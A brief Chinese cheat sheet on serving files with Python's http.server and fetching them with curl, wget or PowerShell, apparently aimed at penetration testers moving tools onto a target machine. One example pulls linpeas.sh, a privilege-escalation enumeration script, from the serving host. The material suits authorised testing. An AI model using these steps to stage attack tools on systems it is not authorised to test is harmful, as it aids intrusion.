# Python 临时 HTTP 服务

Python 自带 HTTP 服务是最常用的临时文件分发方式。它简单可靠，适合在靶机和测试机之间传脚本、日志和小工具。

## 启动服务

```bash
python3 -m http.server 8000
```

```bash
python3 -m http.server 8000 --bind 192.168.1.50
```

```bash
python -m SimpleHTTPServer 8000
```

## 下载文件

```bash
curl -O http://192.168.1.50:8000/linpeas.sh
```

```bash
wget http://192.168.1.50:8000/file.txt
```

```bash
powershell -Command "Invoke-WebRequest http://192.168.1.50:8000/file.exe -OutFile file.exe"
```

## 快速验证

```bash
curl -I http://192.168.1.50:8000/
```

```bash
ss -lntp | grep 8000
```

启动目录就是公开目录，别在含有敏感文件的路径里开服务。传完文件后及时关闭窗口或进程。
